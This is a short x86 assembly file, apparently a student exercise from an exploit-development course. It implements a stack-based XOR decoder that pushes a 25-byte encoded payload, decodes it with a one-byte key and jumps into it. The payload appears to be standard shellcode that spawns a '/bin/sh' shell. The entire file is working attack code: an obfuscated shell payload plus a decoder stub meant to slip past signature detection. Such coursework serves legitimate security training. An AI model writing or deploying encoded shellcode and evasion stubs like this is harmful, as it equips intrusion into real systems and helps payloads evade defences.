; Filename    : decoder.asm
; Author      : Joris Hartog
; Date        : 22-11-2015
; Student     : SLAE-704
; Size        : 25 (code) + 1 (key) + 30 (decoder) = 56
; Description : To encode the shellcode, start the array 
;  with any byte and follow with the shellcode which is 
;  bitwise XOR'd with the chosen byte. Don't forget to 
;  reverse the array when pushing it on the stack.
;
;  This code uses the stack method.

global _start

section .text

_start:

	; PUSH the key and shellcode onto the stack
	xor ebx, ebx
	mov bx, 0x2a67
	push ebx
	push 0xa11a4b23
	push 0xf9fa4923
	push 0xc4c3c885
	push 0xc2c2d985
	push 0x85c24823
	push 0xfa6a9baa

	mov esi, esp
	
	xor ecx, ecx
	mov cl, 25		; ecx contains 25
	xor eax, eax
	mov al, byte [esi]	; eax contains the key
	inc esi			; esi contains pointer to
				; shellcode
decode:

	xor byte [esi], al
	inc esi 

        loop decode

	inc esp
	jmp esp

